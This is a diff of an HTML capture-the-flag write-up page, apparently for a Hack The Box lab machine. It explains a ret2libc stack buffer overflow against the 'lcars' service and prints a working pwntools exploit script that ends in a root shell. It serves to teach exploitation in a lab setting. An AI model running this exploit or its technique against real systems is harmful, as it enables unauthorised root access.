+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000081e &lt;+74&gt;:    call   0x570 &lt;fflush@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000823 &lt;+79&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000826 &lt;+82&gt;:    sub    esp,0x8
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000829 &lt;+85&gt;:    lea    eax,[ebp-0xd0]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000082f &lt;+91&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000830 &lt;+92&gt;:    lea    eax,[ebx-0x213c]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000836 &lt;+98&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000837 &lt;+99&gt;:    call   0x5c0 &lt;__isoc99_scanf@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000083c &lt;+104&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000083f &lt;+107&gt;:    sub    esp,0x8
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000842 &lt;+110&gt;:    lea    eax,[ebp-0xd0]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000848 &lt;+116&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000849 &lt;+117&gt;:    lea    eax,[ebx-0x2138]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000084f &lt;+123&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000850 &lt;+124&gt;:    call   0x560 &lt;printf@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000855 &lt;+129&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000858 &lt;+132&gt;:    nop
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000859 &lt;+133&gt;:    mov    ebx,DWORD PTR [ebp-0x4]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000085c &lt;+136&gt;:    leave  
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000085d &lt;+137&gt;:    ret    
+</span></span></span><span class="line"><span class="cl"><span class="go">End of assembler dump.
+</span></span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s explain some things. In general, when we look at the disassembly code at the top of a function we&rsquo;ll see something like this:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">push</span>   <span class="no">ebp</span>                  <span class="err">//</span><span class="no">backup</span> <span class="no">caller</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">ebp</span>
-<span class="nf">mov</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>              <span class="err">//</span><span class="no">set</span> <span class="no">callee</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">ebp</span> <span class="no">to</span> <span class="no">esp</span>
-<span class="nf">sub</span>    <span class="no">esp</span><span class="p">,</span> <span class="err">&lt;</span><span class="no">some</span> <span class="no">number</span><span class="err">&gt;</span>   <span class="err">//</span><span class="no">stack</span> <span class="no">space</span> <span class="no">for</span> <span class="no">local</span> <span class="no">variables</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">push</span>   <span class="no">ebp</span>                  <span class="err">//</span><span class="no">backup</span> <span class="no">caller</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">ebp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>              <span class="err">//</span><span class="no">set</span> <span class="no">callee</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">ebp</span> <span class="no">to</span> <span class="no">esp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">sub</span>    <span class="no">esp</span><span class="p">,</span> <span class="err">&lt;</span><span class="no">some</span> <span class="no">number</span><span class="err">&gt;</span>   <span class="err">//</span><span class="no">stack</span> <span class="no">space</span> <span class="no">for</span> <span class="no">local</span> <span class="no">variables</span></span></span></code></pre></div></p>
 
 <p>The ebp register will point to the top of our stack for this frame, and esp will point to the next available byte on the stack (stacks typically grow downwards). Now, although we can try different string sizes to find out the correct size for our payload header, we can also try to calculate it. It is quite simple actually. We just find the difference between the numbers in commands that subtract from esp (sub esp, ) and those in commands that add to esp (add esp, ) till the call to __isoc99_scanf function.</p>
 
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="na">...</span>
-<span class="err">0</span><span class="nf">x000007d8</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xd4</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x000007ee</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x000007fd</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="err">0</span><span class="nf">x00000800</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x0000080f</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x0000081a</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span>
-<span class="err">0</span><span class="nf">x00000823</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="err">0</span><span class="nf">x00000826</span> <span class="err">&lt;+</span><span class="mi">82</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0x8</span><span class="p">,</span><span class="nv">%esp</span>
-<span class="na">...</span></code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000007d8</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xd4</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000007ee</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x000007fd</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000800</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000080f</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000081a</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0xc</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000823</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000826</span> <span class="err">&lt;+</span><span class="mi">82</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">$0x8</span><span class="p">,</span><span class="nv">%esp</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span></span></span></code></pre></div>
 
 <p>Therefore: 0xd4 + 0xc - 0x10 + 0xc - 0x10 + 0xc - 0x10 + 0x8 = 0xd0 = 208</p>
 
 <p>In order to overwrite the return address (i.e. eip) with our payload, we have to add 4 to account for pushing caller&rsquo;s ebp into the stack. So our payload header will be 208+4 = 212. If you don&rsquo;t know what I am talking about read this: <a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></p>
 
 <p>Now, let&rsquo;s check if ASLR is enabled on the box:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cat /proc/sys/kernel/randomize_va_space
-<span class="go">0
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /proc/sys/kernel/randomize_va_space
+</span></span><span class="line"><span class="cl"><span class="go">0
+</span></span></span></code></pre></div></div></p>
 
 <p>Nice, ASLR is disabled. Now let&rsquo;s find some useful addresses for our ret2libc payload:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">gdb /bin/lcars
-</span><span class="go">(gdb) print &amp;system
-</span><span class="go"></span><span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">(</span>&lt;text variable, no debug info&gt; *<span class="o">)</span> 0xf7e4c060 &lt;system&gt;
-<span class="go">(gdb) print &amp;exit
-</span><span class="go"></span><span class="gp">$</span><span class="nv">2</span> <span class="o">=</span> <span class="o">(</span>&lt;text variable, no debug info&gt; *<span class="o">)</span> 0xf7e3faf0 &lt;exit&gt;
-<span class="err">
-</span><span class="err"></span><span class="go">find &amp;system,+9999999,&#34;/bin/sh&#34;  
-</span><span class="go">0xf7f70a0f
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">gdb /bin/lcars
+</span></span></span><span class="line"><span class="cl"><span class="go">(gdb) print &amp;system
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">(</span>&lt;text variable, no debug info&gt; *<span class="o">)</span> 0xf7e4c060 &lt;system&gt;
+</span></span><span class="line"><span class="cl"><span class="go">(gdb) print &amp;exit
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span><span class="nv">2</span> <span class="o">=</span> <span class="o">(</span>&lt;text variable, no debug info&gt; *<span class="o">)</span> 0xf7e3faf0 &lt;exit&gt;
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">find &amp;system,+9999999,&#34;/bin/sh&#34;  
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f70a0f
+</span></span></span></code></pre></div></div></p>
 
 <p>If we try to use the address 0xf7f70a0f, it won&rsquo;t work because it contains a newline ASCII code (0x0a). Depending on the context, the scanf() function either removes whitespace or stops reading after a whitespace.</p>
 
 <p>Let&rsquo;s search for plain &lsquo;sh&rsquo;:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">(gdb) find &amp;system,+9999999,&#34;sh&#34;       
-</span><span class="go">0xf7f6ddd5
-</span><span class="go">0xf7f6e7e1
-</span><span class="go">0xf7f70a14
-</span><span class="go">0xf7f72582
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">(gdb) find &amp;system,+9999999,&#34;sh&#34;       
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f6ddd5
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f6e7e1
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f70a14
+</span></span></span><span class="line"><span class="cl"><span class="go">0xf7f72582
+</span></span></span></code></pre></div></div></p>
 
 <p>The address 0xf7f6ddd5 seems just fine.</p>
 
 <h2 id="autopwn-script">Autopwn script</h2>
 
 <p>Here is an autopwn script I wrote:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
-<span class="c1"># Author: Alamot</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">struct</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
-
-<span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
-<span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.61&#34;</span>
-<span class="n">RPORT</span> <span class="o">=</span> <span class="mi">32812</span>
-
-<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
-    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
-
-<span class="k">def</span> <span class="nf">conv</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">num</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">212</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e4c060</span><span class="p">)</span> <span class="c1"># system()</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e3faf0</span><span class="p">)</span> <span class="c1"># exit()</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7f6ddd5</span><span class="p">)</span> <span class="c1"># &#39;sh&#39;</span>
-
-<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Enter Bridge Access Code: &#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;picarda1&#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Waiting for input: &#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Enter Security Override:&#34;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author: Alamot</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.61&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">RPORT</span> <span class="o">=</span> <span class="mi">32812</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conv</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">num</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">212</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e4c060</span><span class="p">)</span> <span class="c1"># system()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e3faf0</span><span class="p">)</span> <span class="c1"># exit()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7f6ddd5</span><span class="p">)</span> <span class="c1"># &#39;sh&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Enter Bridge Access Code: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;picarda1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Waiting for input: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Enter Security Override:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></p>
 
 <p>That&rsquo;s all folks! :)</p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>./pwn_lcars.py 
-<span class="go">[+] Opening connection to 10.10.10.61 on port 32812: Done
-</span><span class="go">[*] Switching to interactive mode
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">$ </span>whoami
-<span class="go">root
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ./pwn_lcars.py 
+</span></span><span class="line"><span class="cl"><span class="go">[+] Opening connection to 10.10.10.61 on port 32812: Done
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Switching to interactive mode
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> whoami
+</span></span><span class="line"><span class="cl"><span class="go">root
+</span></span></span></code></pre></div></div>
 
         </div>
 
@@ -1026,21 +1026,17 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
     </footer>
   </a>
 </article>
@@ -1066,25 +1062,33 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1117,6 +1121,46 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1222,190 +1266,6 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
           
            
            
@@ -1433,42 +1293,6 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
   </a>
 </article>
 
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1526,45 +1350,17 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
     </footer>
   </a>
 </article>
